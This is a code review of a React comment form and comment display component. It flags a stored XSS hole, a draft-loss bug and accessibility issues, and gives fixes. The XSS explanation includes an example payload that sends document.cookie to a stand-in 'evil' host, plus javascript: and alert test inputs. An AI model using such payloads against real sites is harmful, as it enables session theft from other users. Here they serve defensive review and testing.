## Verdict: Fail

I found two must-fix problems. The worst is a stored XSS hole that lets one user run code in every other reader's browser. I only read the code: there's no `package.json`, stylesheet, or parent component in the repo, so I couldn't run anything.

### Must-fix

**1. Stored XSS: comment Markdown is inserted as HTML without cleaning**
Evidence: `src/Comment.tsx:6` and `src/Comment.tsx:10`. `marked.parse(comment.body)` goes straight into `dangerouslySetInnerHTML`. `marked` doesn't clean its output; it dropped its `sanitize` option years ago. Raw HTML passes through, and so do `javascript:` links.
Impact: a comment like `<img src=x onerror="fetch('//evil/?c='+document.cookie)">` or `[click](javascript:…)` runs in the browser of everyone who views it. The form label invites Markdown, so this is exactly what the component is built to accept.
Fix: clean the HTML on the client before inserting it.
```tsx
import DOMPurify from "dompurify";
const html = useMemo(
  () => DOMPurify.sanitize(marked.parse(comment.body, { async: false }) as string, {
    ALLOWED_TAGS: ["p","br","strong","em","code","pre","blockquote","ul","ol","li","a"],
    ALLOWED_ATTR: ["href"],
  }),
  [comment.body]
);
```
You could use `react-markdown` instead, which is safe by default because it never injects raw HTML. Either way, the server should also clean or reject HTML when the comment is saved. A Content Security Policy adds another layer of protection but doesn't replace cleaning.
Verify: post `<img src=x onerror=alert(1)>`, `<script>alert(1)</script>` and `[x](javascript:alert(1))`. None of them should run, and the link should have no `href`.

**2. The draft is erased before the post succeeds, so a failed post loses the text**
Evidence: `src/CommentForm.tsx:5`. `onPost(body); setBody("")` clears the box right away. `onPost` is typed as returning `void`, so the form can't tell whether the request worked.
Impact: if the request fails, the text the user wrote is gone. The form also has no sending state, so a double click posts twice. Empty or whitespace-only comments can be sent too.
Fix: type `onPost` as `(body: string) => Promise<void>` and await it. Clear the box only after it succeeds. Disable the button while sending and show "Posting…". On failure, keep the text and show an error. Block empty bodies with `body.trim()`.
Verify: make `onPost` reject. The text should stay in the box, an error should appear, and a second click while sending should do nothing.

### Should-fix

3. **Fixed `id="c"`** (`CommentForm.tsx:6-7`). Reply forms or a second form on the page will create duplicate ids, and the label may then point at the wrong textarea. Use `useId()`.
4. **No feedback screen readers can hear.** Success and error messages need a `role="status"` or `role="alert"` region. The error should also be linked to the textarea with `aria-describedby`.
5. **Markdown headings break the page's heading order.** A comment starting with `# foo` renders an `<h1>` inside the comment. The allowlist in fix 1 blocks headings. If you want to keep them, shift them down a few levels instead.
6. **Raw timestamp shown to users** (`Comment.tsx:9`). Readers see something like `2026-09-24T10:13:00Z`. Keep that value in the `dateTime` attribute, but display it through `Intl.DateTimeFormat`, or as relative time with the full date as a tooltip.
7. **Long content may overflow.** No styles are visible, so I can't confirm this. Long URLs or code blocks will stretch the layout on mobile unless `.comment-body` sets `overflow-wrap: anywhere` and `pre { overflow-x: auto }`.
8. **No length limit or `required`** on the textarea. Add `maxLength` that matches the server's limit, plus a character counter if the limit is small.
9. **Type name shadows a browser built-in** (`Comment.tsx:3`). The name `Comment` hides the built-in `Comment` DOM type and isn't exported for callers to use. Rename it, for example to `CommentData`, and export it.

### Judgment calls

- **Images in comments.** If you allow `<img>`, anyone can embed a tracking pixel that logs the IP address of each reader. You can drop images (as the allowlist above does), send them through your own server, or accept that risk.
- **External links.** Consider adding `rel="nofollow ugc noopener"` to every link through a DOMPurify `afterSanitizeAttributes` hook, which discourages spam.
- **A preview tab.** The label says Markdown works, but users can't see what their comment will look like before posting.

### What already works

- It's a real `<form>` with a `<label htmlFor>` tied to the textarea, and the button has `type="submit"`, so Enter and keyboard use work.
- `<article>`, `<header>` and `<time dateTime>` are the right elements for this content.
- The label's "(Markdown supported)" hint is specific and useful.
